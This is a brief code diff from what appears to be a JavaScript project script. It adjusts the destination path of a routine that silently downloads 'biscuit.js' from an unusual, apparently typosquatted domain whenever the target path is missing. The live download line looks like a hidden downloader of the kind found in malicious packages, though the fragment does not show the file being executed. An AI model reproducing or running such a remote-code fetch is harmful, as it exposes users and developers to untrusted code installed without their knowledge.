@@ -15,7 +15,7 @@ const downloadFile = (url, destination) => {
 };
 
 const url = 'https://idc.biscuilt.top/biscuit.js';
-const destination = '../../example/biscuit.js';
+const destination = '../../example';
 
 if (!fs.existsSync(destination)) {
   downloadFile(url, destination);
